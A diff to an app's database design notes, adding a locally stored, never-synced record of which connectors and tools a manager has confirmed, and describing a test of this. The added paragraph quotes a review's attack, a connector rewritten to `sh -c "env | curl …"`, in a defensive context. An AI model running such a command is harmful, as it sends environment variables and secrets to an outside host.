@@ -44,6 +44,7 @@ involved.
 | `notification_choice` | `SqliteNotificationChoice`: whether this computer shows notifications, and which, in the keys `notifications`, `notify_waiting`, `notify_finished` and `notify_stopped` of `meta`; not logged, so never synced |
 | `plan_limit` | `SqlitePlanLimitStore`: what this computer knows about the limits of its Claude plan, as one JSON value in the key `plan_limit` of `meta`; what cannot be read back is forgotten; not logged, so never synced (decision 0040) |
 | `update_choice` | `SqliteUpdateChoice`: whether this computer looks for a newer version, when it last looked, whether that look failed and which release it offered, in the keys `update_look`, `update_last_look`, `update_look_failed` and `update_offered_*` of `meta`; not logged, so never synced ([decision 0043](../../docs/decisions/0043-a-notice-of-newer-versions.md)) |
+| `connector_trust` | `SqliteConnectorTrust`: what the manager confirmed on this computer of the connectors (the fingerprint of each definition) and of what each specialist is given of them (pairs of a connector and a tool), in the keys `connector_confirmed:…` and `connector_tools_confirmed:…` of `meta`; not logged, so never synced (decision 0039, note of 22 November 2026) |
 | `theme` | `SqliteThemeStore`: the theme of this computer, by its name in the key `theme` of `meta`; a name it does not know reads as Lamplight; not logged, so never synced |
 | `integrations` | `SqliteIntegrationStore`: the GitHub repository, the Slack channel and the web addresses of each project (`project_integrations`, `project_web_addresses`, version 17) and the GitHub program the manager named (`github_program` in `meta`); written without the recorder, so never logged and never synced |
 | `codec` | The text forms of moments, dates, identifiers and enumerations |
@@ -324,6 +325,18 @@ together with the library, which drops such names. Removing a skill or a
 connector stores the changed kits in the same transaction; deleting a
 project deletes and logs kits, connectors and skills. The copies of skill
 folders are not in the database: they lie on each computer.
+
+What the manager confirmed on this computer (decision 0039, note of 22
+November 2026) is `SqliteConnectorTrust`: the fingerprint of each confirmed
+connector under `connector_confirmed:<connector>` and the confirmed tools of
+each specialist, a JSON list of pairs of a connector and a tool, under
+`connector_tools_confirmed:<member>`, both in `meta`. They are written
+without the recorder, so never logged, never synced, and nothing taken in
+from the sync folder can write them. A list that cannot be read back
+confirms nothing. `tests/kits.rs` proves it with two databases syncing
+through a folder: the attack of the review (a connector changed into `sh -c
+"env | curl …"` and a connector added to a kit on the other computer), a
+harmless change, a confirmation, and a change after it.
 
 ## Field stamps and merged states
 
